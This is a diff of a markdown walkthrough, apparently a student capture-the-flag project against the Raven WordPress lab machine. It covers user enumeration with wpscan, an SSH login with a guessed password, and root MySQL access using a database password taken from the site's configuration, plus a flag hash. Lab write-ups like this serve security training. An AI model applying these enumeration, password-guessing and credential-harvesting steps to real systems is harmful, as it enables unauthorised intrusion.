@@ -57,7 +57,7 @@ wp-scan --url http://192.168.1.110/wordpress --enumerate u
 
 ssh michael@192.168.1.110 -p22
 
-Guessed passwored to be "michael"
+Guessed password to be "michael"
 
 grep -rl 'flag1*'
 
@@ -89,6 +89,23 @@ cat txt file
 
 ![Flag 2](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/Flag%202.png)
 
+flag3 hash: afc01ab56b50591e7dccf93122770cd2
+
+The commands used were:
+(while in Michael's session via ssh)
+cd /var/www/html/wordpress
+
+login to Wordpress databse using "mysql -h localhost root -p wordpress"
+
+password is R@venSecurity
+
+once in DB, "SHOW TABLES;"
+
+SELECT * FROM wp_posts;
+
+![DB login info](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/SQL%20DB%20Config.png)
+
+![Password for database](https://github.com/abge0386/Final-Project/blob/main/Screen%20Shots/SQL%20DB%20Login%20info.png)
 
 
 
